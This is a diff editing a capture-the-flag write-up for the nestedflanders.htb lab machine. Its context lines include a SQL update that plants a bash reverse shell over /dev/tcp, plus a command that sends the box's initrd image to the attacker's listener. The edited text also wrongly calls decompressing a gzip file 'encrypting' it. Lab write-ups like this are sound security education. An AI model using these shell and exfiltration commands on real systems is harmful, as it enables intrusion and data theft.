@@ -33,7 +33,7 @@ Adding **nestedflanders.htb** to my hosts file.
 
 ## Checking HTTP and HTTPS
 
-Browsing to both sites with the IP address gives us a blank page and browsing to **www.nestedflanders.htb** gives us the default Apache2 page.
+Browsing to both sites with the IP address gives us a blank page and browsing to **www[.]nestedflanders.htb** gives us the default Apache2 page.
 We will run _gobuster_ against this to get any directories:
 ```markdown
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://10.10.10.126/
@@ -228,7 +228,7 @@ This looks like it automatically executes a perl script in some intervals. If we
 update config set option_value = "bash -c 'bash -i >& /dev/tcp/10.10.14.4/80 0>&1'" where id = '86';
 ```
 
-This updates the value to our reverse shell and out listener gets a callback after some seconds and we are the user _guly_ on it!
+This updates the value to our reverse shell and our listener gets a callback after some seconds and we are the user _guly_ on it!
 
 ### Privilege Escalation to root
 
@@ -248,12 +248,12 @@ On client: nc -lvnp 80 > initrd.img
 On box: cat /boot/initrd.img-4.9.0-8-amd64 > /dev/tcp/10.10.14.4/80
 ```
 
-It is a **gzip** compressed file that we encrypt like this:
+It is a **gzip** compressed file that we can encrypt:
 ```markdown
 zcat initrd.img | cpio -idmv
 ```
 
-And now we get a file structure from a / folder. We should narrow our target down by looking for files between the creation date  of the SSL file (19-12-2018) and two days forward:
+And now we get a file structure from a / folder. We should narrow our target down by looking for files between the creation date  of the SSL file (19-12-2018) and two days after:
 ```markdown
 find . -type f -newermt 2018-12-19 ! -newermt 2018-12-21 -ls
 ```
